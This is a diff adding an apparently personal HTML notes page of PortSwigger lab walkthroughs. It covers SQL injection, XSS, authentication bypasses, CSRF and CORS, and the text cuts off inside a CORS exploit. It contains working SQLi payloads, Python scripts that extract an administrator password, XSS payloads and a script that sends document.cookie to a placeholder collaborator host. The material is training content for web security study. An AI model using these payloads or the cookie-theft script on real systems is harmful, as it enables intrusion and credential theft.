@@ -1,0 +1,860 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../../img/favicon.ico" />
+    <title>PortSwigger labs - Internship Ramblings</title>
+    <link rel="stylesheet" href="../../css/theme.css" />
+    <link rel="stylesheet" href="../../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "PortSwigger labs";
+        var mkdocs_page_input_path = "portswigger/labs.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <script src="../../js/jquery-3.6.0.min.js" defer></script>
+    <!--[if lt IE 9]>
+      <script src="../../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+      <script>hljs.initHighlightingOnLoad();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href="../.." class="icon icon-home"> Internship Ramblings
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="../..">Home</a>
+                </li>
+              </ul>
+              <p class="caption"><span class="caption-text">OWASP</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../OWASP/api/">Api</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">SAML</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../SAML/saml_notes/">SAML</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Audits</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../audits/PoC/">Coverflex</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../audits/neurowave/">NEUROWAVE, LDA</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Ctfs</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Capital ctf</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../ctfs/capital-ctf/">Index</a>
+                </li>
+    </ul>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Dvga</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../ctfs/dvga/dvga/">Dvga</a>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Dvwss</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../dvwss/notes/">Notes</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Goatlin</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../goatlin/notes/">Goatlin Notes</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Notes</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/api_types/">Api types</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/http2/">Http2</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/nosqli/">NoSQL</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../notes/sql/">SQL - Structured Query Language</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Portswigger</span></p>
+              <ul class="current">
+                  <li class="toctree-l1 current"><a class="reference internal current" href="./">PortSwigger labs</a>
+    <ul class="current">
+    <li class="toctree-l2"><a class="reference internal" href="#sql-injection">SQL Injection</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#first-lab">First LAB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#second-lab">Second LAB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#third-lab">Third LAB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#fourth-lab">Fourth LAB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#fith-lab">Fith LAB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#sixth-lab">Sixth LAB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#seventh-lab">Seventh LAB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#eighth-lab">Eighth Lab</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#ninth-lab">Ninth Lab</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#tenth-lab">Tenth Lab</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#eleventh-lab">Eleventh Lab</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#twelth-lab">Twelth LAB</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#thirthinth-lab">Thirthinth LAB</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#xss">XSS</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#reflected-xss-lab-1">Reflected XSS LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#reflected-xss-lab-2">Reflected XSS LAB 2</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#reflected-xss-lab-3">Reflected XSS LAB 3</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#stored-xss-lab-1">Stored XSS LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#stored-xss-lab-2">Stored XSS LAB 2</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#dom-xss-lab-1">DOM XSS LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#dom-xss-lab-2">DOM XSS LAB 2</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#dom-xss-lab-3">DOM XSS LAB 3</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#dom-xss-lab-4">DOM XSS Lab 4</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#dom-xss-lab-5">DOM XSS LAB 5</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#xss-to-steal-cookies">XSS to steal cookies</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#authentication">Authentication</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#lab-1">Lab 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#lab-2">LAB 2</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#lab-3">LAB 3</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#csrf">CSRF</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#csrf-lab-1">CSRF Lab 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#cors">Cors</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#cors-lab-1">CORS LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#cors-lab-2">CORS LAB 2</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#xxe">XXE</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#xxe-lab-1">XXE LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#xxe-lab-2">XXE LAB 2</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#ssrf-server-side-request-forgery">SSRF - Server Side Request Forgery</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#ssrf-lab-1">SSRF LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#ssrf-lab-2">SSRF LAB 2</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#directory-traversal">Directory Traversal</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#directory-traversal-lab-1">Directory Traversal LAB 1</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#access-control">Access Control</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-1">Access Control LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-2">Access Control LAB 2</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-3">Access Control LAB 3</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-4">Access Control LAB 4</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-5">Access Control LAB 5</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-5_1">Access Control LAB 5</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-6">Access Control LAB 6</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-7">Access Control LAB 7</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#access-control-lab-8">Access Control LAB 8</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#insecure-deserialization">Insecure deserialization</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#insecure-deserialization-lab-1">Insecure deserialization LAB 1</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#information-disclosure">Information Disclosure.</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#information-disclosure-lab-1">Information Disclosure LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#information-disclosure-lab-2">Information Disclosure LAB 2</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#information-disclosure-lab-3">Information Disclosure LAB 3</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#information-disclosure-lab-4">Information Disclosure LAB 4</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#business-logic-vulnerabilities">Business Logic Vulnerabilities</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#business-logic-vulnerabilities-lab-1">Business logic vulnerabilities LAB 1</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#server-side-template-injection">Server Side Template Injection</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#ssti-lab-1">SSTi LAB 1</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#web-cache-poisoning">Web Cache Poisoning</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#web-cache-poisoning-lab-1">Web Cache Poisoning LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#web-cache-poisoning-lab-2">Web Cache Poisoning LAB 2</a>
+    </li>
+        </ul>
+    </li>
+    <li class="toctree-l2"><a class="reference internal" href="#request-smuggling">Request Smuggling</a>
+        <ul>
+    <li class="toctree-l3"><a class="reference internal" href="#lab-1_1">LAB 1</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#lab-2_1">LAB 2</a>
+    </li>
+    <li class="toctree-l3"><a class="reference internal" href="#lab-2_2">LAB 2</a>
+    </li>
+        </ul>
+    </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Quiz</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../quiz/SecurityChampion/">QUIZ</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Research</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../research/angular_notes/">Angular</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../research/dangling%20markup/">Evading CSP with DOM-based dangling markup (PortSwigger) - An alternative approach</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="#">Subdomain takeover</a>
+    <ul>
+                <li class="toctree-l2"><a class="reference internal" href="../../research/subdomain-takeover/">Index</a>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="#">Findings</a>
+    <ul>
+                <li class="toctree-l3"><a class="reference internal" href="../../research/subdomain-takeover/findings/security-advisory/">Security Advisory</a>
+                </li>
+    </ul>
+                </li>
+                <li class="toctree-l2"><a class="reference internal" href="#">Src</a>
+    <ul>
+                <li class="toctree-l3"><a class="reference internal" href="#">Commands</a>
+    <ul>
+                <li class="toctree-l4"><a class="reference internal" href="../../research/subdomain-takeover/src/commands/commands/">Commands</a>
+                </li>
+    </ul>
+                </li>
+                <li class="toctree-l3"><a class="reference internal" href="#">Script</a>
+    <ul>
+                <li class="toctree-l4"><a class="reference internal" href="../../research/subdomain-takeover/src/script/">Index</a>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                </li>
+    </ul>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Techniques</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/interesting/">Techniques created by me (or not) uncommon in the wild</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/methodology/">A methodological checklist to logically deduce the steps needed to pentest a web app.</a>
+                  </li>
+                  <li class="toctree-l1"><a class="reference internal" href="../../techniques/triggers/">Errors based/behaviour inferer</a>
+                  </li>
+              </ul>
+              <p class="caption"><span class="caption-text">Tools</span></p>
+              <ul>
+                  <li class="toctree-l1"><a class="reference internal" href="../../tools/notes/">Notes</a>
+                  </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../..">Internship Ramblings</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href="../.." class="icon icon-home" alt="Docs"></a> &raquo;</li>
+          <li>Portswigger &raquo;</li>
+      <li>PortSwigger labs</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="portswigger-labs">PortSwigger labs</h1>
+<h2 id="sql-injection">SQL Injection</h2>
+<p>It allows an attacker to interfere with database queries and retrieve information he should not be able to access.
+This can be done in various clauses, such as order by, where, having, like. It's important to visualize the current server-side query context by understanding the web app's functionality.</p>
+<p><strong>Note: Filtering is usually done server side (WHERE clause)</strong></p>
+<h3 id="first-lab">First LAB</h3>
+<p>It's a web shop with various products and it can filter them by categories. The category value is directly inserted onto an SQL query in the <code>WHERE</code> clause.
+The objective is to see every product. This can be done with this simple payload: <code>' OR 1=1 --</code></p>
+<h3 id="second-lab">Second LAB</h3>
+<p>It's a web shop but I need to login as administrator. This can be done with a simple <code>WHERE</code> clause payload, as that's where the user input is inserted.
+The payload is: <code>' OR 1=1 --</code></p>
+<p>If the result of the query is outputted in the response, then we can subvert that to retrieve other information from other tables with a UNION attack.
+It allows us to execute one or additional SELECT clauses and append the results to the original set.</p>
+<p><strong>Example</strong></p>
+<p><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></p>
+<p><strong>BUT</strong></p>
+<pre><code>
+    The individual queries must return the same number of columns.
+    The data types in each column must be compatible between the individual queries.
+
+</code></pre>
+<p>So, we need to figure out the number of columns in the original query to append a new query. This can be done with the order by keyword. We can order by the result-set column index.,</p>
+<p><strong>Example</strong></p>
+<p><code>' ORDER BY 1</code>
+<code>' ORDER BY 2</code></p>
+<p>until we reach an error which says column with index 3 is out of range for the given table.</p>
+<p>We can also specify an arbitrary number of values in the new SELECT clause until we avoid the error.</p>
+<p><code>SELECT 1, 2, 3, 4...</code>
+<code>SELECT NULL, NULL, NULL, NULL....</code></p>
+<h3 id="third-lab">Third LAB</h3>
+<p>It's a web shop. We have another category parameter and we know its inserted in a <code>where</code> clause, the objective is to figure out the number of columns in the result set. As such, we do:</p>
+<p><code>' ORDER BY 1</code>. No error.
+<code>' ORDER BY 2</code>. There's no error until 4, which means it has 3 columns. According to the lab description, we must use the <code>NULL</code> technique to solve. So we do: <code>' SELECT NULL,NULL,NULL</code></p>
+<p>Generally speaking, we need to know which columns are being reflected to see the resulting set of the UNION query. We can do that by using a unique character in each value of the SELECT clause and see where that is reflected.</p>
+<p><code>'UNION SELECT 1,NULL,NULL</code>
+<code>' UNION SELECT NULL,1,NULL</code></p>
+<h3 id="fourth-lab">Fourth LAB</h3>
+<p>We need to combine the techniques portrayed earlier, so we insert in the category field: <code>' ORDER BY 2 --</code>. No error. Increasing one more gives us an error, so we have 2 columns in the result set. Next, we see which ones can reflect text. We insert: <code>' UNION SELECT 'hello', 'hello2' --</code>. We see both of the fields reflect text, so we can just: <code>UNION SELECT username,password FROM users --</code></p>
+<h3 id="fith-lab">Fith LAB</h3>
+<p>Sometimes only one column is reflected, so we must concatenating the strings in order to see the output.</p>
+<p>In this case, two are reflected but only one reflects text. First, we figure out which one with: <code>UNION SELECT 'random_text', NULL --</code> and <code>' UNION SELECT NULL, 'random_text' --</code>. We see the second column accepts text, so we place our payload there: <code>' UNION SELE T NULL,username||'~'||password FROM users --</code></p>
+<p><strong>Note: String concatenation is different with each SQL version</strong></p>
+<p>We can query the database version in different ways depending on what type is being served.</p>
+<h3 id="sixth-lab">Sixth LAB</h3>
+<p>We use the techniques from before to figure out the columns in the result set and which one is being reflected. As such, the final payload is: <code>' UNION SELECT @@version, NULL -- -</code></p>
+<p><strong>Note:All SQL versions in the cheatsheet accept -- - as a comment</strong></p>
+<p>Blind SQL injection happens when there is no input reflected on the HTTP response. To test this, an attacker needs to be ware of the output of the application - does the content-length change with different boolean sql logic? That is, the app returns data depending on the query, just not the data you asked for in the query.</p>
+<h3 id="seventh-lab">Seventh LAB</h3>
+<p>It's a blind SQLi, exploitable with the below script, because it looks for changes in the body, that take place if the query is true or not.</p>
+<pre><code>
+2:20 PM
+
+import requests
+import string
+
+def main():
+    password = &quot;&quot;
+    for index in range(1, 21):
+        for char in string.ascii_letters + string.digits:
+            cookies = {&quot;TrackingId&quot;:f&quot;pcLJqgVbBsfqEax3' AND (SELECT SUBSTRING(password, 1, {index}) FROM users WHERE username='administrator')='{password}{char}&quot;, &quot;session&quot;:&quot;LJy9oeGMExJomNP7psWb31UBvNi3Vt6Q&quot;}
+            r = requests.get(&quot;https://0ada000e0444e88dc09a9948005700ad.web-security-academy.net/&quot;, cookies=cookies)
+            if &quot;welcome&quot; not in r.text.lower():
+                continue
+            password += char
+            print(password)
+            index += 1
+main()
+
+</code></pre>
+<h3 id="eighth-lab">Eighth Lab</h3>
+<p>To solve the lab, we need to display the database version string.</p>
+<p>We know we can use a UNION attack.</p>
+<p>First we need to see how many columns there are, we do that with an order by query: <code>' ORDER BY 1 -- -</code>. When we get an error we know there are <code>current column number - 1</code> columns. Then we need to see which columns displays strings. We do that with: <code>' UNION SELECT 'abc','def' -- -</code>. The string reflected implies which column reflects. We know it's the first one, so we switch 'abc' for <code>@@version</code> and <code>'def'</code> for <code>NULL</code>and the lab is solved.</p>
+<h3 id="ninth-lab">Ninth Lab</h3>
+<p>First we need to find the name of the users table: <code>' UNION SELECT table_name, NULL FROM information_schema.tables -- -</code>. </p>
+<p>After, we find the name of the columns in that table: <code>' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=&lt;found_table_name&gt;</code></p>
+<p>Then we simply fetch username and password with our attained knowledge.</p>
+<p><code>' UNION SELECT &lt;found_username_column_name&gt;, &lt;found_password_column_name FROM &lt;found_table_name&gt; -- -</code></p>
+<p>We log in and the lab is solved.</p>
+<h3 id="tenth-lab">Tenth Lab</h3>
+<p>We repeat the same logic but with table_name in the first select and all_tables as the table: <code>' UNION SELECT table_name,NULL FROM all_tables--</code>, then we do: <code>'  UNION  SELECT  column_name,NULL  FROM  all_tab_columns  WHERE  table_name='USERS_ABCDEF'--</code>. Finally we use the attained information to construct a query:
+<code>'   UNION   SELECT   USERNAME_ABCDEF,   PASSWORD_ABCDEF   FROM   USERS_ABCDEF--</code></p>
+<h3 id="eleventh-lab">Eleventh Lab</h3>
+<p>Simply use this script which uses the case when condition and string concatenation to induce conditional errors based on a given character of the password being correct.</p>
+<pre><code>import string
+import requests
+import string
+
+payload = &quot;&quot;
+count = 1
+
+while count &lt;= 30:
+    for char in string.ascii_letters + string.digits:
+        r = requests.get(f&quot;https://0a8d001c0488b738c0eda475002f00cb.web-security-academy.net/&quot;, cookies={&quot;TrackingId&quot;:f&quot;FqkZypIERiKR57Km'||(SELECT CASE WHEN(SUBSTR(password,1,{count})='{payload}{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'&quot;, &quot;session&quot;:&quot;EqyCUGiM2rYeDvhPu8Js9o1I2sB0ZTDK&quot;})
+        if r.status_code != 500:
+            continue
+        payload += char
+        print(f&quot;{payload}\nStatus Code: {r.status_code}&quot;)
+        count += 1
+        break
+
+</code></pre>
+<h3 id="twelth-lab">Twelth LAB</h3>
+<p>Simply induce a time delay in the tracking cookie: <code>x'||pg_sleep(10) -- -</code></p>
+<h3 id="thirthinth-lab">Thirthinth LAB</h3>
+<p>Retrieve information with this script but remember to switch the url for your lab id.</p>
+<pre><code>import requests
+import string
+
+def main():
+    index = 1
+    password = &quot;&quot;
+    while index &lt;= 30:
+        for char in string.ascii_letters + string.digits:
+            r = requests.get(&quot;https://0a5a004b0438160bc046d73800e60088.web-security-academy.net/&quot;, cookies={&quot;TrackingId&quot;:f&quot;x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,{index})='{password}{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--&quot;})
+            if r.elapsed.total_seconds() &lt; 10:
+                continue
+            password += char
+            index += 1
+            print(password)
+            break
+
+main()
+
+</code></pre>
+<h2 id="xss">XSS</h2>
+<p>Occurs when user unvalidated user input is reflected onto the html. An attacker can then inject arbitrary tags, some of which leads to js execution, thus arises cross site scripting.</p>
+<p>XSS is split into three categories:</p>
+<p><strong>Reflected XSS</strong> - it's not stored, the reflection occurs only in the subsequent response to the request.</p>
+<p><strong>Stored XSS</strong> - It's stored somewhere, so the reflection is present even if we close the page and re-open it.</p>
+<p><strong>DOM XSS</strong> - Takes place when user input is placed on a sink that allows execution of js.</p>
+<p><strong>MAIN SINKS</strong></p>
+<pre><code>document.write()
+document.writeln()
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+</code></pre>
+<p><strong>MAIN jQuery Sinks</strong></p>
+<pre><code>add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
+</code></pre>
+<h3 id="reflected-xss-lab-1">Reflected XSS LAB 1</h3>
+<p>There's no encoding, so all we need to do is insert the most common payload of all - <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
+<h3 id="reflected-xss-lab-2">Reflected XSS LAB 2</h3>
+<p>Angle brackets are html encoded, so we can't escape the tag context, therefore we need to append an event handler attribute. The final payload to be inserted in the search box is: <code>" autofocus="" onfocus="alert()</code></p>
+<h3 id="reflected-xss-lab-3">Reflected XSS LAB 3</h3>
+<p>Our input is inserted directly onto js context, so we can simply close the string with quote, subtract our alert() payload from that and subtract to another opening quote: <code>'-alert()-'</code></p>
+<h3 id="stored-xss-lab-1">Stored XSS LAB 1</h3>
+<p>There's no encoding, so all we need to do is insert the most common payload of all - <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
+<h3 id="stored-xss-lab-2">Stored XSS LAB 2</h3>
+<p>Our input is reflected inside an href a tag attribute of the website input, as such, we can simply inject <code>javascript:alert()</code>.</p>
+<h3 id="dom-xss-lab-1">DOM XSS LAB 1</h3>
+<p>There's no encoding, so all we need to do is insert the most common payload of all - <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>
+<h3 id="dom-xss-lab-2">DOM XSS LAB 2</h3>
+<p>We can't inject tags that execute XSS inside <code>&lt;select&gt;, we close it first. Meaning the final payload is:</code>"&gt;</select><img+src="x"+onerror="alert()">`</p>
+<h3 id="dom-xss-lab-3">DOM XSS LAB 3</h3>
+<p>We can't inject <code>&lt;script&gt;</code> or <code>&lt;svg&gt;</code>  inside document.write, so we inject: <code>&lt;img src=x onerror=alert()&gt;</code></p>
+<h3 id="dom-xss-lab-4">DOM XSS Lab 4</h3>
+<p>In this case, we have jquery changing the attribute value of an html tag with <code>attr</code>:</p>
+<pre><code>$(function() {
+    $('#backLink').attr(&quot;href&quot;,(new URLSearchParams(window.location.search)).get('returnUrl'));
+});
+
+</code></pre>
+<p>As such, we can simply use javascript:alert(document.cookie in returnUrl) to solve this lab.</p>
+<h3 id="dom-xss-lab-5">DOM XSS LAB 5</h3>
+<p>This one utilizes the selector sink with window.location.hash:</p>
+<pre><code>$(window).on('hashchange', function(){
+                            var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
+                            if (post) post.get(0).scrollIntoView();
+                        });
+
+</code></pre>
+<p><strong>VULNERABLE SNIPPET</strong>:</p>
+<p><code>var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');</code></p>
+<p>The <code>$()</code> selector sink can inject malicious objects onto the DOM, as such, if we craft a payload like: <code>#&lt;img src=/ onerror=print()&gt;</code>, a print page will pop up.</p>
+<p>With that in mind, we can deliver this exploit to the victim:</p>
+<p><code>&lt;iframe src="https://vulnerable-website.com#" onload="this.src+='&lt;img src=1 onerror=alert(1)&gt;'"&gt;</code> It loads the iframe with that given src and when it loads, appends an xss payload to that src.</p>
+<h3 id="xss-to-steal-cookies">XSS to steal cookies</h3>
+<p>Use burpcollborator to steal the admin's cookies via an XSS at post comment section.</p>
+<pre><code>&lt;script&gt;
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+method: 'POST',
+mode: 'no-cors',
+body:document.cookie
+});
+&lt;/script&gt;
+
+</code></pre>
+<h2 id="authentication">Authentication</h2>
+<p>Its the action of verifying the identity of a given user. It's making sure they are who they claim to be.</p>
+<p><strong>Authentication is the process of verifying that a user really is who they claim to be, whereas authorization involves verifying whether a user is allowed to do something.</strong></p>
+<p>Username enumeration occurs when there's a way to distinguish a failed login attempt from a login attempt with a correct username. It can be response length, time of response, or simply a message such as "There's no username like that in our database."</p>
+<h3 id="lab-1">Lab 1</h3>
+<p>In this LAB, the developer decided to write a message when the username is wrong and when the password doesn't match. With that in mind, we can construct a payload list that iterates over usernames until it finds the "Incorrect password",  and then iterate over the password list until it doesn't say "Incorrect password". Basically, an attacker is able to deduce the account credentials by analyzing the responses given to him.</p>
+<p>username: <strong>arcsight</strong></p>
+<p>password: <strong>hunter</strong></p>
+<h3 id="lab-2">LAB 2</h3>
+<p>This 2FA bypass is fairly simple. Merely login as carlos montoya and when promped for the 2fa code, issue a get request to /my-account. Notice you are logged in.</p>
+<h3 id="lab-3">LAB 3</h3>
+<p>Issue a password reset link from the account wiener, go to email client, click the link, set a new password and click update with intercept on. Notice a POST is sent with a username, change it to carlos, send the request and login to that account with the new password.</p>
+<h2 id="csrf">CSRF</h2>
+<p>CSRF Request forgery takes place when there is an action to be made and cookie based session handling.</p>
+<p>Example (assume cookie based session handling)</p>
+<p><code>GET /change-email?email=example@example.com HTTP/2</code></p>
+<p>This can be crafted onto a URL that is sent to the victim, which, when clicked, changes its email.</p>
+<h3 id="csrf-lab-1">CSRF Lab 1</h3>
+<p>Simply send the following to the body of the /exploit url inside the lab</p>
+<pre><code>&lt;form method=&quot;$method&quot; action=&quot;$url&quot;&gt;
+    &lt;input type=&quot;hidden&quot; name=&quot;$param1name&quot; value=&quot;$param1value&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+        document.forms[0].submit();
+&lt;/script&gt;
+
+</code></pre>
+<p>Change $method to to POST.</p>
+<p>Change $action to the my-account/change-email</p>
+<p>Change $param1name to email</p>
+<p>Change $param1value to an email value.</p>
+<p>Deliver the exploit.</p>
+<h3 id="cors">Cors</h3>
+<p>CORS is a defense mechanism that prevents websites from attacking each other.</p>
+<p>It basically says: Any website with this given origin can talk to me, any other can't.</p>
+<p>It does that by comparing headers, Origin and Access-Control-Allow-Origin. If they match, then the request is sent.</p>
+<p>You can't use credentials if the origin is a wildcard.</p>
+<p>For Access-Control-Allow-Credentials to be true, the Access-Contol-Allow-Origin needs to to not be a wildcard, that is, it needs to be a domain or a group of domains. You can't have *.domain.com as Origin.</p>
+<p>Sometimes developers go the easy way out and code that any request's to their server will be allowed, by simply reflecting the Origin header's value into Access-Control-Allow-Origin.</p>
+<h3 id="cors-lab-1">CORS LAB 1</h3>
+<p>In this case, the origin header is reflected in the server and credentials are allowed.
+We craft a CORS requests like this:</p>
+<pre><code>&lt;script&gt;
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','$url/accountDetails',true);
+    req.withCredentials = true;
